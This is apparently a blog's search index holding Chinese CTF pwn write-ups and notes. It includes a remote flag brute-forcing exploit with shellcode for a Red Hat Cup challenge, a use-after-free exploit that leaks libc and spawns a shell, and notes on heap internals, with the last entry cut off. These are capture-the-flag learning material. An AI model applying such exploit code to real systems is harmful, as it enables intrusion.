<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红帽杯pwn wp</title>
      <link href="/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/"/>
      <url>/2019/11/11/%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>程序静态链接，真恶心，呕。</p><p>首先分析程序流</p><p>main</p><p><img src="//yoursite.com/2019/11/11/红帽杯pwn-wp/D:%5Cblog%5CHexo%5Csource_posts%5C%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp%5Cimage-20191111222819651.png" alt="image-20191111222819651"></p><p>catflag</p><p> <img src="//yoursite.com/2019/11/11/红帽杯pwn-wp/D:%5Cblog%5CHexo%5Csource_posts%5C%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp%5Cimage-20191111222903850.png" alt="image"></p><p>maby is good</p><p><img src="//yoursite.com/2019/11/11/红帽杯pwn-wp/D:%5Cblog%5CHexo%5Csource_posts%5C%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp%5Cimage-20191111222943178.png" alt="image-20191111222943178"></p><p>give me</p><p><img src="//yoursite.com/2019/11/11/红帽杯pwn-wp/D:%5Cblog%5CHexo%5Csource_posts%5C%E7%BA%A2%E5%B8%BD%E6%9D%AFpwn-wp%5Cimage-20191111223104658.png" alt="image-20191111223104658"></p><p>该程序，第一个模块的函数读取了flag，写入bss段。第二个模块的函数又将bss段里的flag写入了堆里，并且将v1里的数据写入bss进行覆盖。第三个模块通过index定位，读取堆里的flag（读取1个字节）放入v2，mmap分配了一个带有执行权限的内存空间，而且可以往里面读3个字节，随后把这个mmap分配的内 存地址赋给一个函数指针，并且执行，在这里把它称为函数v3。</p><p>红箭头指的就是关键地址，我们可以直接分析该模块的汇编。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+var_14]  //这里就是mov eax, v3</span><br><span class="line">call eax  //这就是关键点，执行v3</span><br></pre></td></tr></table></figure><p>那么自然想到往里写入code，使得之后的赋值mov [ebp+var_10], eax （就是对v4赋值）中的eax可控。使得最后的比对可控，是我们控制的v4与flag中的数据进行比对，从而达到爆破的目的</p><p>贴上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*!/usr/bin/python*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#*-\*- coding:UTF-8 -**</span></span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* pwn *<span class="keyword">import</span>* *</span><br><span class="line"></span><br><span class="line">*<span class="keyword">import</span>* string</span><br><span class="line"></span><br><span class="line">*<span class="keyword">from</span>* time *<span class="keyword">import</span>* sleep</span><br><span class="line"></span><br><span class="line">\<span class="comment">#*context.log_level = 'debug'*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> *<span class="title">Game</span>*<span class="params">(index,char)</span>:</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *cn = process('./pwn')*</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#  *gdb.attach(cn,'b \*0x08048C5B')*</span></span><br><span class="line"></span><br><span class="line">  cn = remote(<span class="string">'47.104.190.38'</span>,<span class="number">12001</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="string">'RX\xc3'</span> //push edx ; pop eax ; ret</span><br><span class="line"></span><br><span class="line">  size = ord(char) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Give me a index:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Three is good number,I like it very much!'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send(shellcode)</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Leave you name of size:'</span>)</span><br><span class="line"></span><br><span class="line">  cn.sendline(str(size))</span><br><span class="line"></span><br><span class="line">  cn.recvuntil(<span class="string">'Tell me:\n'</span>)</span><br><span class="line"></span><br><span class="line">  cn.send((size<span class="number">-1</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">  info = cn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">  *<span class="keyword">if</span>*(<span class="string">'2'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">elif</span>*(<span class="string">'1'</span> <span class="keyword">in</span> info):</span><br><span class="line"></span><br><span class="line">​    print(char)</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">return</span>* <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">else</span>*:</span><br><span class="line"></span><br><span class="line">​    cn.close()</span><br><span class="line"></span><br><span class="line">​    print(info)</span><br><span class="line"></span><br><span class="line">​    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">*<span class="keyword">if</span>* __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  src = string.printable</span><br><span class="line"></span><br><span class="line">  flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">for</span>* i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"></span><br><span class="line">​    *<span class="keyword">for</span>* j <span class="keyword">in</span> src:</span><br><span class="line"></span><br><span class="line">​      *<span class="keyword">if</span>* Game(i, j):</span><br><span class="line"></span><br><span class="line">​        flag += j</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">if</span>* j == <span class="string">'&#125;'</span>:</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">​          exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">​        *<span class="keyword">break</span>*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编笔记</title>
      <link href="/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>pop指令首先把ESP指向的堆栈元素内容复制到一个32位或64位的操作数中，再增加ESP的值。如果操作数是32位的，ESP+4，如果操作数是64位的，ESP+8。</p><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop reg/mem32</span><br><span class="line"></span><br><span class="line">pop reg/mem32</span><br></pre></td></tr></table></figure><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>push指令首先减少ESP的值，再将源操作数复制到堆栈。如果操作数是32位的，ESP-4，如果操作数是64位的，ESP-8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push reg/mem32</span><br><span class="line">push reg/mem64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第五届上海市网络安全大赛</title>
      <link href="/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>这题没有show，delete里存在uaf漏洞，多了一个login，里面有strcmp函数，根据你输入的长度size，content与堆里保存的数据进行长度为size的content对比。</p><p>add里在你malloc一个堆块后，又会自行malloc一个size为0x20的堆块，里面有一个指针，指向你的ptr  ←就是我们利用的点了。</p><p>贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span> , arch = <span class="string">'amd64'</span> , log_level = <span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./login'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">login</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line">d = sh.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> d == <span class="string">'Login success!'</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="comment">#这里就是爆破对比</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">guess</span><span class="params">(index,prefix)</span>:</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">  <span class="keyword">if</span>(login(index,chr(i)+prefix)):</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="comment">#这里就是从7f开始比对，执行6次</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"> addr=<span class="string">''</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">edit(<span class="number">4</span>,chr(<span class="number">0x95</span>-i))</span><br><span class="line">addr = chr(guess(<span class="number">0</span>,addr))+addr</span><br><span class="line"> <span class="keyword">return</span> u64(<span class="string">'\x00'</span>+addr + <span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"pass:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">'\x90'</span>)<span class="comment">#1</span></span><br><span class="line">base = leak()<span class="number">-0x3c4b00</span></span><br><span class="line">log.success(<span class="string">'libc.addr = '</span> + hex(base))</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">binsh = base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system = base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">add(<span class="number">5</span>,p64(binsh)+p64(system))</span><br><span class="line">sh.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'id:\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">password = <span class="string">'/bin/sh'</span></span><br><span class="line">sh.sendlineafter(<span class="string">'length:\n'</span>,str(len(password)))</span><br><span class="line">sh.sendafter(<span class="string">'password:\n'</span>,password)</span><br><span class="line">exploit()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>（爆破的感觉有点爽）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>堆的整理</title>
      <link href="/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/"/>
      <url>/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p>malloc chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>free chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="堆叠技巧"><a href="#堆叠技巧" class="headerlink" title="堆叠技巧"></a>堆叠技巧</h3><p> <a href="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a> </p><p>这位师傅的blog里讲的很详细了。</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>malloc_consolidate() 函数是定义在 malloc.c 中的一个函数，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。</p><h4 id="malloc-consolidate调用条件"><a href="#malloc-consolidate调用条件" class="headerlink" title="malloc_consolidate调用条件"></a>malloc_consolidate调用条件</h4><h5 id="1-malloc-large-bin"><a href="#1-malloc-large-bin" class="headerlink" title="1. malloc large bin"></a>1. malloc large bin</h5><p> 假如malloc的size大于small bin的范围，先调用malloc_consolidate将fastbin 合并为unsorted bin </p><p>在64位系统下，small bin &lt;0x400</p><p>在32位系统下，small bin &lt;0x200</p><h5 id="2-top-chunk不够空间"><a href="#2-top-chunk不够空间" class="headerlink" title="2. top chunk不够空间"></a>2. top chunk不够空间</h5><p>下面是简单的测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0x20e48</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x300</span>);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-在free函数在各种合并前后chunk之后的size大于FASTBIN-CONSOLIDATION-THRESHOLD-也就是65536"><a href="#3-在free函数在各种合并前后chunk之后的size大于FASTBIN-CONSOLIDATION-THRESHOLD-也就是65536" class="headerlink" title="3. 在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536"></a>3. 在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536</h5><p>比较容易实现的是与top chunk合并后size大于FASTBIN_CONSOLIDATION_THRESHOLD 具体大概是下面的流程</p><ol><li>判断chunk是否属于fastbin，如果不是，继续</li><li>判断chunk是否属于map的，如果不是，继续</li><li>假如下一个chunk是top chunk，合并</li><li>判断当前chunk的size是否大于FASTBIN_CONSOLIDATION_THRESHOLD，假如大于，调用malloc_consolidate</li></ol><p>测试代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="keyword">void</span>* h3 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">free</span>(h3);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆的attack大致方法"><a href="#堆的attack大致方法" class="headerlink" title="堆的attack大致方法"></a>堆的attack大致方法</h3><p>首先需要leak的内容：</p><p>1.主模块的基地址</p><p>2.heap的基地址</p><p>3.libc.so的基地址</p><p>常规流程是通过获取main_arena地址，因为main_arena存在于libc.so中可以通过计算偏移得到libc.so的基地址。再根据main_arena地址获得hook地址</p><p>malloc_hook_addr = main_arena_addr - 0x10</p><p>然后要么system + binsh  要么one_gadget   getshell</p><ul><li>堆内存未初始化</li><li>堆溢出</li><li>Use-After-Free</li><li>越界读</li><li>heap extend</li></ul><p>以上都可以进行leak。</p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p> uaf漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。 </p><p>根本原因：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</span><br></pre></td></tr></table></figure><p>（所以你看到的某些ptr = null  , ptr = 0。 然后进入到堆块里查看内容，发现堆块里的内容还是能看得到以前写入的数据，但是不能读取，就是这了。它被打上了空闲标记，但是没有真正清除（大概是这个意思吧？））</p><p>一种是直接进行free，且没有进行任何限制的</p><p><img src="//yoursite.com/2019/10/29/“堆的整理”/D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D%5Cimage-20191103123730845.png" alt="image-20191103123730845"></p><p><img src="//yoursite.com/2019/10/29/“堆的整理”/D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D%5Cimage-20191103125527078.png" alt="image-20191103125527078"></p><p>这种直接malloc,delete,show。</p><p>另一种就是*没悬空，其他该置零的置零。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>复现题目中探究的一些杂记</title>
      <link href="/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/"/>
      <url>/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/</url>
      
